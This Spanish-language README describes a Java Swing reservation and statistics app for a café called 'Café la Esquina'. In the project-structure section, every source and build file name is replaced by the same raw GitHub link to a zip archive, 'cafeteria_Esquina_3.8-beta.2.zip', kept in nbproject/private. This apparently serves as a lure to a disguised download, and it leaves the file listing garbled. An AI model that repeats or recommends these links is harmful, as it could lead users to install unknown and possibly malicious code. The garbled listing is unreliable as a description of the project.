# Café la Esquina - Sistema de Reservaciones

## Descripción General

Este proyecto es una aplicación de escritorio desarrollada en Java utilizando Swing para la interfaz gráfica de usuario (GUI). Se trata de un sistema simple de gestión de reservaciones para un café llamado "Café la Esquina". El sistema permite registrar clientes con sus datos de reservación, consultar la lista de clientes, buscar por cédula, y generar reportes estadísticos sobre la ocupación por días, mesas y totales semanales.

El código está organizado en el directorio `src/`, dividido en dos paquetes principales:

- **Interfaz**: Contiene las clases de la GUI.
- **Logica**: Maneja la lógica de negocio, incluyendo la estructura de datos para clientes y el seguimiento de ocupación.

La aplicación utiliza una lista enlazada para almacenar los datos de los clientes y un arreglo bidimensional para rastrear la cantidad de clientes por mesa y día de la semana. El sistema permite configurar dinámicamente el número de mesas al inicio y está configurado para 6 días de la semana (de lunes a sábado).

## Estructura del Proyecto

### Directorio `src/`

- **Interfaz/**
  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria_Esquina_3.8-beta.2.zip`: Ventana inicial que solicita al usuario ingresar el número de mesas disponibles en el café.
  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria_Esquina_3.8-beta.2.zip`: Menú principal con opciones para:
    - Ingresar un nuevo cliente (abre la ventana de registro).
    - Consultar todos los clientes.
    - Buscar cliente por número de cédula.
    - Ver total de clientes por semana.
    - Ver total de clientes por día de la semana.
    - Ver total de clientes por mesa.
    - Identificar el día con más clientes.
  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria_Esquina_3.8-beta.2.zip`: Formulario para registrar un cliente, solicitando nombre, número de cédula, mesa (dinámicamente basado en el número de mesas ingresado), y día de la semana (lunes-sábado). Captura automáticamente la hora de ingreso.
- **Logica/**
  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria_Esquina_3.8-beta.2.zip`: Clase principal de lógica. Maneja:
    - Inicialización de la matriz de ocupación (número de mesas dinámico x 6 días).
    - Inserción de clientes en una lista enlazada.
    - Consultas (todas las clientes o por ID).
    - Cálculos estadísticos (totales por semana, día, mesa; día más ocupado).
    - Conversión de números de día a nombres en español.
  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria_Esquina_3.8-beta.2.zip`: Clase que representa a un cliente, con atributos como nombre, cédula, posición de mesa, día de la semana y hora de ingreso. Incluye método para mostrar los atributos.
  - `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria_Esquina_3.8-beta.2.zip`: Clase para nodos de la lista enlazada que almacena los objetos `Persona`.
- `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria_Esquina_3.8-beta.2.zip`: Clase principal de ejecución. Inicia la aplicación creando una instancia de `crudCliente_Logica` y abriendo la ventana inicial (`logicaNegocio`).

### Archivos Adicionales

- Archivos `.form`: Generados por NetBeans para el diseño de las interfaces GUI (no editar manualmente).
- `https://github.com/cristiancrakl/cafeteriaEsquina/raw/refs/heads/main/nbproject/private/cafeteria_Esquina_3.8-beta.2.zip` y `nbproject/`: Archivos de configuración para compilación con Ant (usado en NetBeans).

## Características Principales

- **Registro de Clientes**: Formulario para ingresar nombre, cédula, mesa (dinámicamente basado en el número de mesas configurado) y día de la semana (lunes-sábado). Valida entradas y registra la hora actual de ingreso.
- **Menú Principal**: Interfaz con botones para acceder a todas las funciones: registrar cliente, consultar, buscar, reportes.
- **Gestión de Datos**:
  - Lista enlazada para almacenar clientes (permite inserciones eficientes).
  - Matriz 2D para contar ocupación por mesa y día (facilita reportes).
- **Reportes**:
  - Consulta completa de clientes con sus detalles.
  - Búsqueda por cédula.
  - Totales semanales, por día (lunes a sábado), por mesa.
  - Día con mayor afluencia de clientes.
- **Interfaz en Español**: Todos los labels y mensajes están en español, adaptados al contexto de un café.
- **Manejo de Errores**: Usa `JOptionPane` para mostrar mensajes de éxito, error o validación.

## Requisitos

- Java Development Kit (JDK) 8 o superior.
- Entorno de desarrollo como NetBeans (recomendado, ya que usa formularios GUI generados) o cualquier IDE compatible con Swing.
- No requiere dependencias externas; todo es estándar de Java.

## Cómo Ejecutar la Aplicación

1. Abre el proyecto en NetBeans.
2. Compila el código: En NetBeans
3. Ejecuta la aplicación:

   ```
   java Run
   ```

4. **Flujo de Uso**:
   - Se abre la ventana inicial para ingresar el número de mesas disponibles.
   - Después de ingresar y validar el número de mesas, se abre la ventana de registro de cliente.
   - Ingresa los datos del cliente y registra.
   - Después de registrar, se abre el menú principal.
   - Desde el menú, puedes registrar más clientes, consultar todos, buscar por cédula, o ver reportes estadísticos.
   - La aplicación cierra al salir de cualquier ventana principal.

## Limitaciones y Mejoras Posibles

- **Persistencia**: Los datos se pierden al cerrar la aplicación (en memoria). Podría agregarse guardado en archivo o base de datos.
- **Validaciones**: Mejora el manejo de excepciones (ej. entradas no numéricas).
- **UI/UX**: Interfaz básica podría mejorarse con diseños más modernos o validaciones en tiempo real.
- **Escalabilidad**: La lista enlazada es simple está bien para este sistema pero para grandes volúmenes, habría que considerar estructuras más eficientes.
- **Configuración**: El número de mesas es dinámico, pero los días de la semana están limitados a lunes-sábado (6 días).

## Autor

- Desarrollado por Cristiancrakl Keiner y Compañia.
